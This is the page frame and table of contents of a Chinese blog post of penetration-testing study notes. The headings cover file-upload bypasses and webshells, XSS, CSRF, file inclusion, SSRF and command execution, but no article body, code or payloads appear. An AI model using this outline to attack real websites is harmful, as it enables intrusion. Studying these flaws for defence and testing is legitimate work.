href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202112122042020.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/tags/qqpay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/tags/qqpay.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/tags/qqpay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/tags/qqpay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/20.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202112040142268.jpeg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">简要sql注入</div></div></a></div><div class="next-post pull-right"><a href="/posts/9.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111260314953.jpeg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SpringBoot</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/2.html" title="内网环境搭建1"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111260311468.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-18</div><div class="title">内网环境搭建1</div></div></a></div><div><a href="/posts/18.html" title="NECAT使用"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111300418219.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-30</div><div class="title">NECAT使用</div></div></a></div><div><a href="/posts/3.html" title="内网信息收集"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111260313439.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-19</div><div class="title">内网信息收集</div></div></a></div><div><a href="/posts/16.html" title="域内信息收集"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111261150870.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-22</div><div class="title">域内信息收集</div></div></a></div><div><a href="/posts/19.html" title="PowerCat&&SSH使用"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111302300983.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-30</div><div class="title">PowerCat&&SSH使用</div></div></a></div><div><a href="/posts/17.html" title="域内信息收集+icmp隧道"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/bigbug888/bigbug_img/img/202111300420199.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-30</div><div class="title">域内信息收集+icmp隧道</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://z3.ax1x.com/2021/11/24/oCuZS1.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zhaoze-jpg/Xianqi@main/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">BigBug</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" href="https://bigbug888.github.io/"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/bigbug888" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=xxxxxxx&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%8D%8F%E8%AE%AE%E7%90%86%E8%AE%BA"><span class="toc-number">1.</span> <span class="toc-text">HTTP协议理论</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">http协议状态码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">渗透测试流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">一般的渗透测试流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%8E%E7%A1%AE%E7%9B%AE%E6%A0%87"><span class="toc-number">2.1.1.</span> <span class="toc-text">明确目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.3.</span> <span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.4.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90"><span class="toc-number">2.1.5.</span> <span class="toc-text">信息分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.6.</span> <span class="toc-text">利用漏洞获取数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%95%B4%E7%90%86"><span class="toc-number">2.1.7.</span> <span class="toc-text">信息整理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%8A%A5%E5%91%8A"><span class="toc-number">2.1.8.</span> <span class="toc-text">写报告</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%94%B6%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">1.端口收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">1. 什么是文件上传：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%B1%E5%AE%B3"><span class="toc-number">4.2.</span> <span class="toc-text">2.危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%89%8D%E6%8F%90"><span class="toc-number">4.3.</span> <span class="toc-text">3.文件上传漏洞的前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E4%BC%9A%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.4.</span> <span class="toc-text">4.什么情况下会导致文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6%E6%89%8B%E6%AE%B5%E5%92%8C%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5-%E4%BB%A5%E5%8F%8A%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E8%A2%AB%E7%BB%95%E8%BF%87%EF%BC%8C%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">4.5.</span> <span class="toc-text">5.文件上传限制手段和绕过手段    以及过滤不严被绕过，绕过黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BF%9D%E6%8A%A4%E9%A2%84%E9%98%B2%EF%BC%9A"><span class="toc-number">4.6.</span> <span class="toc-text">6.文件上传的保护预防：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-webshell"><span class="toc-number">4.7.</span> <span class="toc-text">7.webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">5.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-XSS%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">1.XSS原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS%E5%8D%B1%E5%AE%B3%EF%BC%8C%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text">2.XSS危害，攻击手段以及攻击流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-XSS%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">5.3.</span> <span class="toc-text">3.XSS注入思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XSS%E9%98%B2%E8%8C%83"><span class="toc-number">5.4.</span> <span class="toc-text">4.XSS防范</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BB%95%E8%BF%87"><span class="toc-number">5.5.</span> <span class="toc-text">5.绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-XSS%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-number">5.6.</span> <span class="toc-text">6.XSS分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get%E5%92%8Cpost"><span class="toc-number">5.7.</span> <span class="toc-text">7.反射型xss get和post</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">6.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">6.1.</span> <span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-csrf%E5%92%8Cxss%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">6.2.</span> <span class="toc-text">2.csrf和xss的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-csrf%E5%89%8D%E6%8F%90"><span class="toc-number">6.3.</span> <span class="toc-text">3.csrf前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">6.4.</span> <span class="toc-text">4.漏洞测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">6.5.</span> <span class="toc-text">5.防范措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">常见的业务逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%89%E5%93%AA%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.1.</span> <span class="toc-text">1.有哪些常见的业务逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.1.1.</span> <span class="toc-text">1.弱口令漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">7.1.2.</span> <span class="toc-text">2.暴力破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-number">7.1.3.</span> <span class="toc-text">3.客户端验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E5%85%85%E5%80%BC"><span class="toc-number">7.1.4.</span> <span class="toc-text">4.任意密码充值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%9A"><span class="toc-number">7.1.5.</span> <span class="toc-text">5.越权访问：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E4%BA%A4%E6%98%93%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.1.6.</span> <span class="toc-text">6.交易漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E7%9F%AD%E4%BF%A1%E7%82%B8%E5%BC%B9"><span class="toc-number">7.1.7.</span> <span class="toc-text">7.短信炸弹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="toc-number">7.2.</span> <span class="toc-text">2.常见业务逻辑漏洞基本挖掘思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">7.2.1.</span> <span class="toc-text">1.暴力破解漏洞挖掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">7.2.2.</span> <span class="toc-text">2.绕过验证漏洞挖掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">7.2.3.</span> <span class="toc-text">3.越权访问漏洞挖掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BA%A4%E6%98%93%E7%AF%A1%E6%94%B9%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">7.2.4.</span> <span class="toc-text">4.交易篡改漏洞挖掘</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%B8%9A%E5%8A%A1%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97%E4%B8%8E%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.3.</span> <span class="toc-text">3.业务功能模块与业务逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86%E7%B1%BB"><span class="toc-number">7.3.1.</span> <span class="toc-text">1.账户管理类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%94%B5%E5%AD%90%E5%95%86%E5%8A%A1%E7%B1%BB"><span class="toc-number">7.3.2.</span> <span class="toc-text">2.电子商务类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%9A%E5%8A%A1%E6%9C%8D%E5%8A%A1%E7%B1%BB"><span class="toc-number">7.3.3.</span> <span class="toc-text">3.业务服务类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">8.1.</span> <span class="toc-text">原理以及漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">8.2.</span> <span class="toc-text">常见的文件包含函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-number">8.3.</span> <span class="toc-text">文件包含分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%9A"><span class="toc-number">8.3.1.</span> <span class="toc-text">本地文件包含：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.3.2.</span> <span class="toc-text">远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8-%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.4.</span> <span class="toc-text">文件包含的利用   条件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%9C%80%E8%A6%81%E6%BB%A1%E8%B6%B3%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">8.4.0.1.</span> <span class="toc-text">利用文件包含需要满足两个基本条件：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">8.4.0.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#lfi%E5%88%A9%E7%94%A8"><span class="toc-number">8.4.0.2.1.</span> <span class="toc-text">lfi利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#rfi%E5%88%A9%E7%94%A8"><span class="toc-number">8.4.0.2.2.</span> <span class="toc-text">rfi利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AEfile"><span class="toc-number">8.4.0.2.3.</span> <span class="toc-text">伪协议file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AEdata-%E5%92%8C-php-input"><span class="toc-number">8.4.0.2.4.</span> <span class="toc-text">伪协议data:&#x2F;&#x2F; 和 php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#php-filter"><span class="toc-number">8.4.0.2.5.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">8.5.</span> <span class="toc-text">本地文件漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%A2%84%E9%98%B2"><span class="toc-number">8.6.</span> <span class="toc-text">本地文件包含预防</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E4%B8%8E%E4%B8%8B%E8%BD%BD"><span class="toc-number">9.</span> <span class="toc-text">任意文件查看与下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-amp-%E5%8D%B1%E5%AE%B3-amp-%E5%88%86%E7%B1%BB%EF%BC%9A"><span class="toc-number">9.1.</span> <span class="toc-text">1.原理&amp;危害&amp;分类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">9.2.</span> <span class="toc-text">2.漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">9.3.</span> <span class="toc-text">3.漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">9.4.</span> <span class="toc-text">4.漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">10.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">10.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E5%8D%B1%E5%AE%B3"><span class="toc-number">10.3.</span> <span class="toc-text">SSRF危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">10.4.</span> <span class="toc-text">SSRF漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E7%9A%84ssrf%E5%AE%9E%E4%BE%8B%E4%BB%A5%E5%8F%8A%E7%BB%95%E8%BF%87"><span class="toc-number">10.5.</span> <span class="toc-text">通用的ssrf实例以及绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">10.5.0.1.</span> <span class="toc-text">绕过：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E9%98%B2%E8%8C%83"><span class="toc-number">10.6.</span> <span class="toc-text">ssrf防范</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text">任意代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-1"><span class="toc-number">11.1.</span> <span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%B1%E5%AE%B3-1"><span class="toc-number">11.2.</span> <span class="toc-text">2.危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%8F%8A%E5%85%B6%E5%87%BD%E6%95%B0"><span class="toc-number">11.3.</span> <span class="toc-text">3.利用及其函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1"><span class="toc-number">11.4.</span> <span class="toc-text">4.防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-2"><span class="toc-number">12.1.</span> <span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%88%90%E5%9B%A0%EF%BC%9A"><span class="toc-number">12.2.</span> <span class="toc-text">2.成因：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8D%B1%E5%AE%B3"><span class="toc-number">12.3.</span> <span class="toc-text">3.危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">12.4.</span> <span class="toc-text">4.命令执行漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">12.4.1.</span> <span class="toc-text">1.相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">12.4.2.</span> <span class="toc-text">2.系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 